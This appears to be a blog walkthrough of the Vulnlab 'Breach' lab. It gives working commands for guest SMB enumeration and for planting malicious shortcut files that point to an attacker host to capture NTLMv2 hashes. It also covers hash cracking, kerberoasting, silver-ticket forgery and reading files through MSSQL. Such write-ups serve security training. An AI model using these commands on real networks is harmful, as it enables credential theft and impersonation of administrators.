+++
title = '[Vulnlab] Breach'
date = 2024-10-21T10:25:48+02:00
tags = ['pentesting', 'kerberoasting', 'silver ticket']
draft = false
+++

![Proof](/images/vulnlab_breach/banner.png)

# Walkthrough

## 1. Enumeration
Testing Null sessions, and guest sessions reveals a Working guest session.
```bash
nxc smb "$DC_IP" -u 'a' -p '' --shares
```
![Shares](/images/vulnlab_breach/shares.png)
We have access to three shares:
* IPC$
* share
* Users

A guest session also lets us enumerate all users
```bash
nxc smb "$DC_IP" -u 'a' -p '' --rid-brute | tee u
grep SidTypeUser u | cut -d '\' -f2 | cut -d ' ' -f1 | tee users.txt
```

![Users](/images/vulnlab_breach/usernames.png)

### 1a. Placing shortcut files on SMB shares to grab NTLMv2 hashes
Mounting the shares for quick access, by putting the sharenames into 'list.txt':
```
cat list.txt
Admin$
C$
IPC$
NETLOGON
share
SYSVOL
Users
```

```bash
while read SHARE; do mkdir "$SHARE"; mount -t cifs //"$DC_IP"/"$SHARE" "$SHARE" -o username=guest,password=''; done < list.txt
mount -t cifs
```

![mounted](/images/vulnlab_breach/mounted.png)

Listing the share with 
```
tree -a
```
reveals no credentials. However, it does show a lot of `.lnk` files, which reminds us to Google for shortcut files, which leads to a [Post](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/living-off-the-land#shortcut-files-scf-lnk-url) from Hacker recipies.

Shortcut files can be placed in a SMB Share. If anyone uses a file explorer to view the files, we can grab their NTLMv2 Hash.

If there was a host with SMB singing off, this could be relayed for a SMB Session.
Since there is only one target, it's only feasible to use `Responder` and crack the hash.

First generate one malicious file with `ntlm_theft.py` in all the shares we have write access:

```bash
# Create one malicious file
nxc smb "$DC_IP" -u 'guest' -p '' -M slinky -o SERVER="$ATTACKER_IP" NAME="@Q4Bonus"
# Copy that file to all folders
find . -writable -exec cp /root/shares/share/@Q4Bonus.lnk {} \;
```

This put the file in all these shares
```bash
find . -name '@Q4Bonus.lnk'
./Users/Public/@Q4Bonus.lnk
./Users/Public/AccountPictures/@Q4Bonus.lnk
./Users/Public/Documents/@Q4Bonus.lnk
./Users/Public/Downloads/@Q4Bonus.lnk
./Users/Public/Libraries/@Q4Bonus.lnk
./Users/Public/Music/@Q4Bonus.lnk
./Users/Public/Pictures/@Q4Bonus.lnk
./Users/Public/Videos/@Q4Bonus.lnk
./@Q4Bonus.lnk
./share/@Q4Bonus.lnk
./share/finance/@Q4Bonus.lnk
./share/software/@Q4Bonus.lnk
./share/transfer/@Q4Bonus.lnk
```

After starting Responder, immediately some Hashes occur:

```bash
Responder -I tun0
```
![Responder](/images/vulnlab_breach/Responder.png)

## 2. Julia Wong

Cracking the hash with hashcat and the `rockyou.txt` wordlist reveals the password `C*******1`
```bash
hashcat -m 5600 hash.txt /opt/rockyout.txt
```
Julia has more access to shares:
![julia_shares](/images/vulnlab_breach/julia_shares.png)

Which get remounted with the following command.
```bash
while read SHARE; do umount "$SHARE"; mkdir "$SHARE"; mount -t cifs //"$DC_IP"/"$SHARE" "$SHARE" -o username="$USER",password="$PASSWORD"; done < list.txt
```

The user flag can be found in 
```
./share/transfer/julia.wong/local.txt
```

<!-- ### 2a. Bloodhound
Gathering Bloodhound data with `rusthound`:
```bash
rusthound -d "$DOMAIN" -u "$USER"@"$DOMAIN" -p "$PASSWORD" --zip --adcs --old-bloodhound  
```

Reveals no interesting information immediatly... -->


### 2a. Kerberoastable accounts
The following command uses kerberoasting to get hashes from 
Accounts with SPN enabled.
```bash
GetUserSPNs.py -outputfile Kerberoastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
```

![getuserspn](/images/vulnlab_breach/getuserspn.png)

The from the command we can read the SPN:
```bash
MSSQLSvc/breachdc.breach.vl:1433
```


Using 
```bash
hashcat -m 13100 Kerberoastables.txt /opt/rockyou.txt
```

This gives the user `svc_mssql` with the password `T******1`

## 3. Svc_mssql -> Silver ticket
Armed with the NTLM-hash of the `svc_mssql` user, it is possible to create a [silver ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver)

This effectively allows an attacker to impersonate any user on the server.

The command is:
1. Get the DOMAIN-SID with 
```bash
lookupsid.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST" 0
```
2. Forge a silver ticket
```bash
ticketer.py -nthash "$NT_HASH" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -spn MSSQLSvc/breachdc.breach.vl:1433 administrator
```
3. Authenticate with silver ticket
```bash
export KRB5CCNAME="$(pwd)/Administrator.ccache"
mssqlclient.py -k "$DC_HOST"."$DOMAIN"  
```
![mssqlclient](/images/vulnlab_breach/mssqlclient.png)

The Root flag can be then accessed via the mssqlclient:
```sql
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents
```